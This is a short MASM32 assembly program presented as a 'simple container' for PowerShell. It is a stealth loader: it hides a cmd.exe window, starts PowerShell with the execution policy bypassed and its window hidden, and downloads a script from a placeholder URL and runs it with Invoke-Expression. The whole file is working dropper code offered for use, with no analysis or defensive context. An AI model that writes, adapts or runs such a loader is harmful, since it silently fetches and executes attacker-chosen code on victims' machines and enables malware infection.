; Author : Suleiman Al-Othman
; Ver. : 0.1
; Simple Container PowerShell with Asm
; MASM32
.386
.model flat, stdcall
option casemap:none

include shell32.inc
include kernel32.inc
include windows.inc

includelib shell32.lib
includelib kernel32.lib

.data
vOp db 'open',0
vCm db "C:\windows\system32\cmd.exe",0
vArg db "/c powershell -ExecutionPolicy b -noprofile -windowstyle hidden -noexit -Command $ameer = new-object System.Net.WebClient;Invoke-Expression $ameer.DownloadString('[LINK-CODE]');",0

.code
start:
invoke ShellExecute,0,offset vOp,offset vCm,offset vArg,NULL,SW_HIDE    
invoke ExitProcess,0
end start
